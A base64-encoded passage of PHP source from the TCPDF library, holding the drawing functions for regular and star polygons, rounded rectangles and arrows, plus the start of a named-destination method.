PgoJICogPC91bD4KCSAqIElmIGEga2V5IGlzIG5vdCBwcmVzZW50IG9yIGlzIG51bGwsIG5vdCBkcmF3cyB0aGUgc2lkZS4gRGVmYXVsdCB2YWx1ZSBpcyBkZWZhdWx0IGxpbmUgc3R5bGUgKGVtcHR5IGFycmF5KS4KCSAqIEBwYXJhbSBhcnJheSAkZmlsbF9jb2xvciBGaWxsIGNvbG9yLiBGb3JtYXQ6IGFycmF5KHJlZCwgZ3JlZW4sIGJsdWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gc3RyaW5nICRjaXJjbGVfc3R5bGUgU3R5bGUgb2YgcmVuZGVyaW5nIG9mIGluc2NyaWJlZCBjaXJjbGUgKGlmIGRyYXdzKS4gUG9zc2libGUgdmFsdWVzIGFyZToKCSAqIDx1bD4KCSAqCSA8bGk+RCBvciBlbXB0eSBzdHJpbmc6IERyYXcgKGRlZmF1bHQpLjwvbGk+CgkgKgkgPGxpPkY6IEZpbGwuPC9saT4KCSAqCSA8bGk+REYgb3IgRkQ6IERyYXcgYW5kIGZpbGwuPC9saT4KCSAqCSA8bGk+Q05aOiBDbGlwcGluZyBtb2RlICh1c2luZyB0aGUgZXZlbi1vZGQgcnVsZSB0byBkZXRlcm1pbmUgd2hpY2ggcmVnaW9ucyBsaWUgaW5zaWRlIHRoZSBjbGlwcGluZyBwYXRoKS48L2xpPgoJICoJIDxsaT5DRU86IENsaXBwaW5nIG1vZGUgKHVzaW5nIHRoZSBub256ZXJvIHdpbmRpbmcgbnVtYmVyIHJ1bGUgdG8gZGV0ZXJtaW5lIHdoaWNoIHJlZ2lvbnMgbGllIGluc2lkZSB0aGUgY2xpcHBpbmcgcGF0aCkuPC9saT4KCSAqIDwvdWw+CgkgKiBAcGFyYW0gYXJyYXkgJGNpcmNsZV9vdXRMaW5lX3N0eWxlIExpbmUgc3R5bGUgb2YgaW5zY3JpYmVkIGNpcmNsZSAoaWYgZHJhd3MpLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS4gRGVmYXVsdCB2YWx1ZTogZGVmYXVsdCBsaW5lIHN0eWxlIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gYXJyYXkgJGNpcmNsZV9maWxsX2NvbG9yIEZpbGwgY29sb3Igb2YgaW5zY3JpYmVkIGNpcmNsZSAoaWYgZHJhd3MpLiBGb3JtYXQ6IGFycmF5KHJlZCwgZ3JlZW4sIGJsdWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wOCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFJlZ3VsYXJQb2x5Z29uKCR4MCwgJHkwLCAkciwgJG5zLCAkYW5nbGU9MCwgJGRyYXdfY2lyY2xlPWZhbHNlLCAkc3R5bGU9JycsICRsaW5lX3N0eWxlPWFycmF5KCksICRmaWxsX2NvbG9yPWFycmF5KCksICRjaXJjbGVfc3R5bGU9JycsICRjaXJjbGVfb3V0TGluZV9zdHlsZT1hcnJheSgpLCAkY2lyY2xlX2ZpbGxfY29sb3I9YXJyYXkoKSkgewoJCWlmICgzID4gJG5zKSB7CgkJCSRucyA9IDM7CgkJfQoJCWlmICgkZHJhd19jaXJjbGUpIHsKCQkJJHRoaXMtPkNpcmNsZSgkeDAsICR5MCwgJHIsIDAsIDM2MCwgJGNpcmNsZV9zdHlsZSwgJGNpcmNsZV9vdXRMaW5lX3N0eWxlLCAkY2lyY2xlX2ZpbGxfY29sb3IpOwoJCX0KCQkkcCA9IGFycmF5KCk7CgkJZm9yICgkaSA9IDA7ICRpIDwgJG5zOyArKyRpKSB7CgkJCSRhID0gJGFuZ2xlICsgKCRpICogMzYwIC8gJG5zKTsKCQkJJGFfcmFkID0gZGVnMnJhZCgoZmxvYXQpICRhKTsKCQkJJHBbXSA9ICR4MCArICgkciAqIHNpbigkYV9yYWQpKTsKCQkJJHBbXSA9ICR5MCArICgkciAqIGNvcygkYV9yYWQpKTsKCQl9CgkJJHRoaXMtPlBvbHlnb24oJHAsICRzdHlsZSwgJGxpbmVfc3R5bGUsICRmaWxsX2NvbG9yKTsKCX0KCgkvKioKCSAqIERyYXdzIGEgc3RhciBwb2x5Z29uCgkgKiBAcGFyYW0gZmxvYXQgJHgwIEFic2Npc3NhIG9mIGNlbnRlciBwb2ludC4KCSAqIEBwYXJhbSBmbG9hdCAkeTAgT3JkaW5hdGUgb2YgY2VudGVyIHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICRyIFJhZGl1cyBvZiBpbnNjcmliZWQgY2lyY2xlLgoJICogQHBhcmFtIGludGVnZXIgJG52IE51bWJlciBvZiB2ZXJ0aWNlcy4KCSAqIEBwYXJhbSBpbnRlZ2VyICRuZyBOdW1iZXIgb2YgZ2FwIChpZiAoJG5nICUgJG52ID0gMSkgdGhlbiBpcyBhIHJlZ3VsYXIgcG9seWdvbikuCgkgKiBAcGFyYW0gZmxvYXQgJGFuZ2xlIEFuZ2xlIG9yaWVudGVkIChhbnRpLWNsb2Nrd2lzZSkuIERlZmF1bHQgdmFsdWU6IDAuCgkgKiBAcGFyYW0gYm9vbGVhbiAkZHJhd19jaXJjbGUgRHJhdyBpbnNjcmliZWQgY2lyY2xlIG9yIG5vdC4gRGVmYXVsdCB2YWx1ZSBpcyBmYWxzZS4KCSAqIEBwYXJhbSBzdHJpbmcgJHN0eWxlIFN0eWxlIG9mIHJlbmRlcmluZy4gU2VlIHRoZSBnZXRQYXRoUGFpbnRPcGVyYXRvcigpIGZ1bmN0aW9uIGZvciBtb3JlIGluZm9ybWF0aW9uLgoJICogQHBhcmFtIGFycmF5ICRsaW5lX3N0eWxlIExpbmUgc3R5bGUgb2YgcG9seWdvbiBzaWRlcy4gQXJyYXkgd2l0aCBrZXlzIGFtb25nIHRoZSBmb2xsb3dpbmc6CgkgKiA8dWw+CgkgKgkgPGxpPmFsbDogTGluZSBzdHlsZSBvZiBhbGwgc2lkZXMuIEFycmF5IGxpa2UgZm9yCgkgKiBTZXRMaW5lU3R5bGUoKS48L2xpPgoJICoJIDxsaT4wIHRvIChuIC0gMSk6IExpbmUgc3R5bGUgb2YgZWFjaCBzaWRlLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS48L2xpPgoJICogPC91bD4KCSAqIElmIGEga2V5IGlzIG5vdCBwcmVzZW50IG9yIGlzIG51bGwsIG5vdCBkcmF3cyB0aGUgc2lkZS4gRGVmYXVsdCB2YWx1ZSBpcyBkZWZhdWx0IGxpbmUgc3R5bGUgKGVtcHR5IGFycmF5KS4KCSAqIEBwYXJhbSBhcnJheSAkZmlsbF9jb2xvciBGaWxsIGNvbG9yLiBGb3JtYXQ6IGFycmF5KHJlZCwgZ3JlZW4sIGJsdWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gc3RyaW5nICRjaXJjbGVfc3R5bGUgU3R5bGUgb2YgcmVuZGVyaW5nIG9mIGluc2NyaWJlZCBjaXJjbGUgKGlmIGRyYXdzKS4gUG9zc2libGUgdmFsdWVzIGFyZToKCSAqIDx1bD4KCSAqCSA8bGk+RCBvciBlbXB0eSBzdHJpbmc6IERyYXcgKGRlZmF1bHQpLjwvbGk+CgkgKgkgPGxpPkY6IEZpbGwuPC9saT4KCSAqCSA8bGk+REYgb3IgRkQ6IERyYXcgYW5kIGZpbGwuPC9saT4KCSAqCSA8bGk+Q05aOiBDbGlwcGluZyBtb2RlICh1c2luZyB0aGUgZXZlbi1vZGQgcnVsZSB0byBkZXRlcm1pbmUgd2hpY2ggcmVnaW9ucyBsaWUgaW5zaWRlIHRoZSBjbGlwcGluZyBwYXRoKS48L2xpPgoJICoJIDxsaT5DRU86IENsaXBwaW5nIG1vZGUgKHVzaW5nIHRoZSBub256ZXJvIHdpbmRpbmcgbnVtYmVyIHJ1bGUgdG8gZGV0ZXJtaW5lIHdoaWNoIHJlZ2lvbnMgbGllIGluc2lkZSB0aGUgY2xpcHBpbmcgcGF0aCkuPC9saT4KCSAqIDwvdWw+CgkgKiBAcGFyYW0gYXJyYXkgJGNpcmNsZV9vdXRMaW5lX3N0eWxlIExpbmUgc3R5bGUgb2YgaW5zY3JpYmVkIGNpcmNsZSAoaWYgZHJhd3MpLiBBcnJheSBsaWtlIGZvciBTZXRMaW5lU3R5bGUoKS4gRGVmYXVsdCB2YWx1ZTogZGVmYXVsdCBsaW5lIHN0eWxlIChlbXB0eSBhcnJheSkuCgkgKiBAcGFyYW0gYXJyYXkgJGNpcmNsZV9maWxsX2NvbG9yIEZpbGwgY29sb3Igb2YgaW5zY3JpYmVkIGNpcmNsZSAoaWYgZHJhd3MpLiBGb3JtYXQ6IGFycmF5KHJlZCwgZ3JlZW4sIGJsdWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wOCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFN0YXJQb2x5Z29uKCR4MCwgJHkwLCAkciwgJG52LCAkbmcsICRhbmdsZT0wLCAkZHJhd19jaXJjbGU9ZmFsc2UsICRzdHlsZT0nJywgJGxpbmVfc3R5bGU9YXJyYXkoKSwgJGZpbGxfY29sb3I9YXJyYXkoKSwgJGNpcmNsZV9zdHlsZT0nJywgJGNpcmNsZV9vdXRMaW5lX3N0eWxlPWFycmF5KCksICRjaXJjbGVfZmlsbF9jb2xvcj1hcnJheSgpKSB7CgkJaWYgKCRudiA8IDIpIHsKCQkJJG52ID0gMjsKCQl9CgkJaWYgKCRkcmF3X2NpcmNsZSkgewoJCQkkdGhpcy0+Q2lyY2xlKCR4MCwgJHkwLCAkciwgMCwgMzYwLCAkY2lyY2xlX3N0eWxlLCAkY2lyY2xlX291dExpbmVfc3R5bGUsICRjaXJjbGVfZmlsbF9jb2xvcik7CgkJfQoJCSRwMiA9IGFycmF5KCk7CgkJJHZpc2l0ZWQgPSBhcnJheSgpOwoJCWZvciAoJGkgPSAwOyAkaSA8ICRudjsgKyskaSkgewoJCQkkYSA9ICRhbmdsZSArICgkaSAqIDM2MCAvICRudik7CgkJCSRhX3JhZCA9IGRlZzJyYWQoKGZsb2F0KSAkYSk7CgkJCSRwMltdID0gJHgwICsgKCRyICogc2luKCRhX3JhZCkpOwoJCQkkcDJbXSA9ICR5MCArICgkciAqIGNvcygkYV9yYWQpKTsKCQkJJHZpc2l0ZWRbXSA9IGZhbHNlOwoJCX0KCQkkcCA9IGFycmF5KCk7CgkJJGkgPSAwOwoJCWRvIHsKCQkJJHBbXSA9ICRwMlskaSAqIDJdOwoJCQkkcFtdID0gJHAyWygkaSAqIDIpICsgMV07CgkJCSR2aXNpdGVkWyRpXSA9IHRydWU7CgkJCSRpICs9ICRuZzsKCQkJJGkgJT0gJG52OwoJCX0gd2hpbGUgKCEkdmlzaXRlZFskaV0pOwoJCSR0aGlzLT5Qb2x5Z29uKCRwLCAkc3R5bGUsICRsaW5lX3N0eWxlLCAkZmlsbF9jb2xvcik7Cgl9CgoJLyoqCgkgKiBEcmF3cyBhIHJvdW5kZWQgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR5IE9yZGluYXRlIG9mIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoLgoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodC4KCSAqIEBwYXJhbSBmbG9hdCAkciB0aGUgcmFkaXVzIG9mIHRoZSBjaXJjbGUgdXNlZCB0byByb3VuZCBvZmYgdGhlIGNvcm5lcnMgb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBzdHJpbmcgJHJvdW5kX2Nvcm5lciBEcmF3cyByb3VuZGVkIGNvcm5lciBvciBub3QuIFN0cmluZyB3aXRoIGEgMCAobm90IHJvdW5kZWQgaS1jb3JuZXIpIG9yIDEgKHJvdW5kZWQgaS1jb3JuZXIpIGluIGktcG9zaXRpb24uIFBvc2l0aW9ucyBhcmUsIGluIG9yZGVyIGFuZCBiZWdpbiB0byAwOiB0b3AgcmlnaHQsIGJvdHRvbSByaWdodCwgYm90dG9tIGxlZnQgYW5kIHRvcCBsZWZ0LiBEZWZhdWx0IHZhbHVlOiBhbGwgcm91bmRlZCBjb3JuZXIgKCIxMTExIikuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFNlZSB0aGUgZ2V0UGF0aFBhaW50T3BlcmF0b3IoKSBmdW5jdGlvbiBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCSAqIEBwYXJhbSBhcnJheSAkYm9yZGVyX3N0eWxlIEJvcmRlciBzdHlsZSBvZiByZWN0YW5nbGUuIEFycmF5IGxpa2UgZm9yIFNldExpbmVTdHlsZSgpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGxpbmUgc3R5bGUgKGVtcHR5IGFycmF5KS4KCSAqIEBwYXJhbSBhcnJheSAkZmlsbF9jb2xvciBGaWxsIGNvbG9yLiBGb3JtYXQ6IGFycmF5KEdSRVkpIG9yIGFycmF5KFIsRyxCKSBvciBhcnJheShDLE0sWSxLKSBvciBhcnJheShDLE0sWSxLLFNwb3RDb2xvck5hbWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgMi4xLjAwMCAoMjAwOC0wMS0wOCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFJvdW5kZWRSZWN0KCR4LCAkeSwgJHcsICRoLCAkciwgJHJvdW5kX2Nvcm5lcj0nMTExMScsICRzdHlsZT0nJywgJGJvcmRlcl9zdHlsZT1hcnJheSgpLCAkZmlsbF9jb2xvcj1hcnJheSgpKSB7CgkJJHRoaXMtPlJvdW5kZWRSZWN0WFkoJHgsICR5LCAkdywgJGgsICRyLCAkciwgJHJvdW5kX2Nvcm5lciwgJHN0eWxlLCAkYm9yZGVyX3N0eWxlLCAkZmlsbF9jb2xvcik7Cgl9CgoJLyoqCgkgKiBEcmF3cyBhIHJvdW5kZWQgcmVjdGFuZ2xlLgoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR5IE9yZGluYXRlIG9mIHVwcGVyLWxlZnQgY29ybmVyLgoJICogQHBhcmFtIGZsb2F0ICR3IFdpZHRoLgoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodC4KCSAqIEBwYXJhbSBmbG9hdCAkcnggdGhlIHgtYXhpcyByYWRpdXMgb2YgdGhlIGVsbGlwc2UgdXNlZCB0byByb3VuZCBvZmYgdGhlIGNvcm5lcnMgb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBmbG9hdCAkcnkgdGhlIHktYXhpcyByYWRpdXMgb2YgdGhlIGVsbGlwc2UgdXNlZCB0byByb3VuZCBvZmYgdGhlIGNvcm5lcnMgb2YgdGhlIHJlY3RhbmdsZS4KCSAqIEBwYXJhbSBzdHJpbmcgJHJvdW5kX2Nvcm5lciBEcmF3cyByb3VuZGVkIGNvcm5lciBvciBub3QuIFN0cmluZyB3aXRoIGEgMCAobm90IHJvdW5kZWQgaS1jb3JuZXIpIG9yIDEgKHJvdW5kZWQgaS1jb3JuZXIpIGluIGktcG9zaXRpb24uIFBvc2l0aW9ucyBhcmUsIGluIG9yZGVyIGFuZCBiZWdpbiB0byAwOiB0b3AgcmlnaHQsIGJvdHRvbSByaWdodCwgYm90dG9tIGxlZnQgYW5kIHRvcCBsZWZ0LiBEZWZhdWx0IHZhbHVlOiBhbGwgcm91bmRlZCBjb3JuZXIgKCIxMTExIikuCgkgKiBAcGFyYW0gc3RyaW5nICRzdHlsZSBTdHlsZSBvZiByZW5kZXJpbmcuIFNlZSB0aGUgZ2V0UGF0aFBhaW50T3BlcmF0b3IoKSBmdW5jdGlvbiBmb3IgbW9yZSBpbmZvcm1hdGlvbi4KCSAqIEBwYXJhbSBhcnJheSAkYm9yZGVyX3N0eWxlIEJvcmRlciBzdHlsZSBvZiByZWN0YW5nbGUuIEFycmF5IGxpa2UgZm9yIFNldExpbmVTdHlsZSgpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGxpbmUgc3R5bGUgKGVtcHR5IGFycmF5KS4KCSAqIEBwYXJhbSBhcnJheSAkZmlsbF9jb2xvciBGaWxsIGNvbG9yLiBGb3JtYXQ6IGFycmF5KEdSRVkpIG9yIGFycmF5KFIsRyxCKSBvciBhcnJheShDLE0sWSxLKSBvciBhcnJheShDLE0sWSxLLFNwb3RDb2xvck5hbWUpLiBEZWZhdWx0IHZhbHVlOiBkZWZhdWx0IGNvbG9yIChlbXB0eSBhcnJheSkuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC45LjAxOSAoMjAxMC0wNC0yMikKCSAqLwoJcHVibGljIGZ1bmN0aW9uIFJvdW5kZWRSZWN0WFkoJHgsICR5LCAkdywgJGgsICRyeCwgJHJ5LCAkcm91bmRfY29ybmVyPScxMTExJywgJHN0eWxlPScnLCAkYm9yZGVyX3N0eWxlPWFycmF5KCksICRmaWxsX2NvbG9yPWFycmF5KCkpIHsKCQlpZiAoJHRoaXMtPnN0YXRlICE9IDIpIHsKCQkJcmV0dXJuOwoJCX0KCQlpZiAoKCRyb3VuZF9jb3JuZXIgPT0gJzAwMDAnKSBPUiAoKCRyeCA9PSAkcnkpIEFORCAoJHJ4ID09IDApKSkgewoJCQkvLyBOb3Qgcm91bmRlZAoJCQkkdGhpcy0+UmVjdCgkeCwgJHksICR3LCAkaCwgJHN0eWxlLCAkYm9yZGVyX3N0eWxlLCAkZmlsbF9jb2xvcik7CgkJCXJldHVybjsKCQl9CgkJLy8gUm91bmRlZAoJCWlmICghKGZhbHNlID09PSBzdHJwb3MoJHN0eWxlLCAnRicpKSBBTkQgaXNfYXJyYXkoJGZpbGxfY29sb3IpKSB7CgkJCSR0aGlzLT5zZXRGaWxsQ29sb3JBcnJheSgkZmlsbF9jb2xvcik7CgkJfQoJCSRvcCA9IFRDUERGX1NUQVRJQzo6Z2V0UGF0aFBhaW50T3BlcmF0b3IoJHN0eWxlKTsKCQlpZiAoJG9wID09ICdmJykgewoJCQkkYm9yZGVyX3N0eWxlID0gYXJyYXkoKTsKCQl9CgkJaWYgKCRib3JkZXJfc3R5bGUpIHsKCQkJJHRoaXMtPnNldExpbmVTdHlsZSgkYm9yZGVyX3N0eWxlKTsKCQl9CgkJJE15QXJjID0gNCAvIDMgKiAoc3FydCgyKSAtIDEpOwoJCSR0aGlzLT5fb3V0UG9pbnQoJHggKyAkcngsICR5KTsKCQkkeGMgPSAkeCArICR3IC0gJHJ4OwoJCSR5YyA9ICR5ICsgJHJ5OwoJCSR0aGlzLT5fb3V0TGluZSgkeGMsICR5KTsKCQlpZiAoJHJvdW5kX2Nvcm5lclswXSkgewoJCQkkdGhpcy0+X291dEN1cnZlKCR4YyArICgkcnggKiAkTXlBcmMpLCAkeWMgLSAkcnksICR4YyArICRyeCwgJHljIC0gKCRyeSAqICRNeUFyYyksICR4YyArICRyeCwgJHljKTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+X291dExpbmUoJHggKyAkdywgJHkpOwoJCX0KCQkkeGMgPSAkeCArICR3IC0gJHJ4OwoJCSR5YyA9ICR5ICsgJGggLSAkcnk7CgkJJHRoaXMtPl9vdXRMaW5lKCR4ICsgJHcsICR5Yyk7CgkJaWYgKCRyb3VuZF9jb3JuZXJbMV0pIHsKCQkJJHRoaXMtPl9vdXRDdXJ2ZSgkeGMgKyAkcngsICR5YyArICgkcnkgKiAkTXlBcmMpLCAkeGMgKyAoJHJ4ICogJE15QXJjKSwgJHljICsgJHJ5LCAkeGMsICR5YyArICRyeSk7CgkJfSBlbHNlIHsKCQkJJHRoaXMtPl9vdXRMaW5lKCR4ICsgJHcsICR5ICsgJGgpOwoJCX0KCQkkeGMgPSAkeCArICRyeDsKCQkkeWMgPSAkeSArICRoIC0gJHJ5OwoJCSR0aGlzLT5fb3V0TGluZSgkeGMsICR5ICsgJGgpOwoJCWlmICgkcm91bmRfY29ybmVyWzJdKSB7CgkJCSR0aGlzLT5fb3V0Q3VydmUoJHhjIC0gKCRyeCAqICRNeUFyYyksICR5YyArICRyeSwgJHhjIC0gJHJ4LCAkeWMgKyAoJHJ5ICogJE15QXJjKSwgJHhjIC0gJHJ4LCAkeWMpOwoJCX0gZWxzZSB7CgkJCSR0aGlzLT5fb3V0TGluZSgkeCwgJHkgKyAkaCk7CgkJfQoJCSR4YyA9ICR4ICsgJHJ4OwoJCSR5YyA9ICR5ICsgJHJ5OwoJCSR0aGlzLT5fb3V0TGluZSgkeCwgJHljKTsKCQlpZiAoJHJvdW5kX2Nvcm5lclszXSkgewoJCQkkdGhpcy0+X291dEN1cnZlKCR4YyAtICRyeCwgJHljIC0gKCRyeSAqICRNeUFyYyksICR4YyAtICgkcnggKiAkTXlBcmMpLCAkeWMgLSAkcnksICR4YywgJHljIC0gJHJ5KTsKCQl9IGVsc2UgewoJCQkkdGhpcy0+X291dExpbmUoJHgsICR5KTsKCQkJJHRoaXMtPl9vdXRMaW5lKCR4ICsgJHJ4LCAkeSk7CgkJfQoJCSR0aGlzLT5fb3V0KCRvcCk7Cgl9CgoJLyoqCgkgKiBEcmF3cyBhIGdyYWhpYyBhcnJvdy4KCSAqIEBwYXJhbSBmbG9hdCAkeDAgQWJzY2lzc2Egb2YgZmlyc3QgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkwIE9yZGluYXRlIG9mIGZpcnN0IHBvaW50LgoJICogQHBhcmFtIGZsb2F0ICR4MSBBYnNjaXNzYSBvZiBzZWNvbmQgcG9pbnQuCgkgKiBAcGFyYW0gZmxvYXQgJHkxIE9yZGluYXRlIG9mIHNlY29uZCBwb2ludC4KCSAqIEBwYXJhbSBpbnQgJGhlYWRfc3R5bGUgKDAgPSBkcmF3IG9ubHkgYXJyb3doZWFkIGFybXMsIDEgPSBkcmF3IGNsb3NlZCBhcnJvd2hlYWQsIGJ1dCBubyBmaWxsLCAyID0gY2xvc2VkIGFuZCBmaWxsZWQgYXJyb3doZWFkLCAzID0gZmlsbGVkIGFycm93aGVhZCkKCSAqIEBwYXJhbSBmbG9hdCAkYXJtX3NpemUgbGVuZ3RoIG9mIGFycm93aGVhZCBhcm1zCgkgKiBAcGFyYW0gaW50ICRhcm1fYW5nbGUgYW5nbGUgYmV0d2VlbiBhbiBhcm0gYW5kIHRoZSBzaGFmdAoJICogQGF1dGhvciBQaW90ciBHYWxlY2tpLCBOaWNvbGEgQXN1bmksIEFuZHkgTWVpZXIKCSAqIEBzaW5jZSA0LjYuMDE4ICgyMDA5LTA3LTEwKQoJICovCglwdWJsaWMgZnVuY3Rpb24gQXJyb3coJHgwLCAkeTAsICR4MSwgJHkxLCAkaGVhZF9zdHlsZT0wLCAkYXJtX3NpemU9NSwgJGFybV9hbmdsZT0xNSkgewoJCS8vIGdldHRpbmcgYXJyb3cgZGlyZWN0aW9uIGFuZ2xlCgkJLy8gMCBkZWcgYW5nbGUgaXMgd2hlbiBib3RoIGFybXMgZ28gYWxvbmcgWCBheGlzLiBhbmdsZSBncm93cyBjbG9ja3dpc2UuCgkJJGRpcl9hbmdsZSA9IGF0YW4yKCgkeTAgLSAkeTEpLCAoJHgwIC0gJHgxKSk7CgkJaWYgKCRkaXJfYW5nbGUgPCAwKSB7CgkJCSRkaXJfYW5nbGUgKz0gKDIgKiBNX1BJKTsKCQl9CgkJJGFybV9hbmdsZSA9IGRlZzJyYWQoJGFybV9hbmdsZSk7CgkJJHN4MSA9ICR4MTsKCQkkc3kxID0gJHkxOwoJCWlmICgkaGVhZF9zdHlsZSA+IDApIHsKCQkJLy8gY2FsY3VsYXRlIHRoZSBzdG9wcGluZyBwb2ludCBmb3IgdGhlIGFycm93IHNoYWZ0CgkJCSRzeDEgPSAkeDEgKyAoKCRhcm1fc2l6ZSAtICR0aGlzLT5MaW5lV2lkdGgpICogY29zKCRkaXJfYW5nbGUpKTsKCQkJJHN5MSA9ICR5MSArICgoJGFybV9zaXplIC0gJHRoaXMtPkxpbmVXaWR0aCkgKiBzaW4oJGRpcl9hbmdsZSkpOwoJCX0KCQkvLyBtYWluIGFycm93IGxpbmUgLyBzaGFmdAoJCSR0aGlzLT5MaW5lKCR4MCwgJHkwLCAkc3gxLCAkc3kxKTsKCQkvLyBsZWZ0IGFycm93aGVhZCBhcm0gdGlwCgkJJHgyTCA9ICR4MSArICgkYXJtX3NpemUgKiBjb3MoJGRpcl9hbmdsZSArICRhcm1fYW5nbGUpKTsKCQkkeTJMID0gJHkxICsgKCRhcm1fc2l6ZSAqIHNpbigkZGlyX2FuZ2xlICsgJGFybV9hbmdsZSkpOwoJCS8vIHJpZ2h0IGFycm93aGVhZCBhcm0gdGlwCgkJJHgyUiA9ICR4MSArICgkYXJtX3NpemUgKiBjb3MoJGRpcl9hbmdsZSAtICRhcm1fYW5nbGUpKTsKCQkkeTJSID0gJHkxICsgKCRhcm1fc2l6ZSAqIHNpbigkZGlyX2FuZ2xlIC0gJGFybV9hbmdsZSkpOwoJCSRtb2RlID0gJ0QnOwoJCSRzdHlsZSA9IGFycmF5KCk7CgkJc3dpdGNoICgkaGVhZF9zdHlsZSkgewoJCQljYXNlIDA6IHsKCQkJCS8vIGRyYXcgb25seSBhcnJvd2hlYWQgYXJtcwoJCQkJJG1vZGUgPSAnRCc7CgkJCQkkc3R5bGUgPSBhcnJheSgxLCAxLCAwKTsKCQkJCWJyZWFrOwoJCQl9CgkJCWNhc2UgMTogewoJCQkJLy8gZHJhdyBjbG9zZWQgYXJyb3doZWFkLCBidXQgbm8gZmlsbAoJCQkJJG1vZGUgPSAnRCc7CgkJCQlicmVhazsKCQkJfQoJCQljYXNlIDI6IHsKCQkJCS8vIGNsb3NlZCBhbmQgZmlsbGVkIGFycm93aGVhZAoJCQkJJG1vZGUgPSAnREYnOwoJCQkJYnJlYWs7CgkJCX0KCQkJY2FzZSAzOiB7CgkJCQkvLyBmaWxsZWQgYXJyb3doZWFkCgkJCQkkbW9kZSA9ICdGJzsKCQkJCWJyZWFrOwoJCQl9CgkJfQoJCSR0aGlzLT5Qb2x5Z29uKGFycmF5KCR4MkwsICR5MkwsICR4MSwgJHkxLCAkeDJSLCAkeTJSKSwgJG1vZGUsICRzdHlsZSwgYXJyYXkoKSk7Cgl9CgoJLy8gRU5EIEdSQVBISUMgRlVOQ1RJT05TIFNFQ1RJT04gLS0tLS0tLS0tLS0tLS0tLS0tLS0tLS0KCgkvKioKCSAqIEFkZCBhIE5hbWVkIERlc3RpbmF0aW9uLgoJICogTk9URTogZGVzdGluYXRpb24gbmFtZXMgYXJlIHVuaXF1ZSwgc28gb25seSBsYXN0IGVudHJ5IHdpbGwgYmUgc2F2ZWQuCgkgKiBAcGFyYW0gc3RyaW5nICRuYW1lIERlc3RpbmF0aW9uIG5hbWUuCgkgKiBAcGFyYW0gZmxvYXQgJHkgWSBwb3NpdGlvbiBpbiB1c2VyIHVuaXRzIG9mIHRoZSBkZXN0aWFudGlvbiBvbiB0aGUgc2VsZWN0ZWQgcGFnZSAoZGVmYXVsdCA9IC0xID0gY3VycmVudCBwb3NpdGlvbjsgMCA9IHBhZ2Ugc3RhcnQ7KS4KCSAqIEBwYXJhbSBpbnR8c3RyaW5nICRwYWdlIFRhcmdldCBwYWdlIG51bWJlciAobGVhdmUgZW1wdHkgZm9yIGN1cnJlbnQgcGFnZSkuIElmIHlvdSBwcmVmaXggYSBwYWdlIG51bWJlciB3aXRoIHRoZSAqIGNoYXJhY3RlciwgdGhlbiB0aGlzIHBhZ2Ugd2lsbCBub3QgYmUgY2hhbmdlZCB3aGVuIGFkZGluZy9kZWxldGluZy9tb3ZpbmcgcGFnZXMuCgkgKiBAcGFyYW0gZmxvYXQgJHggWCBwb3NpdGlvbiBpbiB1c2VyIHVuaXRzIG9mIHRoZSBkZXN0aWFudGlvbiBvbiB0aGUgc2VsZWN0ZWQgcGFnZSAoZGVmYXVsdCA9IC0xID0gY3VycmVudCBwb3NpdGlvbjspLgoJICogQHJldHVybiBzdHJpbmd8ZmFsc2UgU3RyaXBwZWQgbmFtZWQgZGVzdGluYXRpb24gaWRlbnRpZmllciBvciBmYWxzZSBpbiBjYXNlIG9mIGVycm9yLgoJICogQHB1YmxpYwoJICogQGF1dGhvciBDaHJpc3RpYW4gRGVsaWdhbnQsIE5pY29sYSBBc3VuaQoJICogQHNpbmNlIDUuOS4wOTcgKDIwMTEtMDYtMjMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBzZXREZXN0aW5hdGlvbigkbmFtZSwgJHk9LTEsICRwYWdlPScnLCAkeD0tMSkgewoJCS8vIHJlbW92ZSB1bnN1cHBvcnRlZCBjaGFyYWN0ZXJzCgkJJG5hbWUgPSBUQ1BERl9TVEFUSUM6OmVuY29kZU5hbWVPYmplY3QoJG5hbWUpOwoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkbmFtZSkpIHsKCQkJcmV0dXJuIGZhb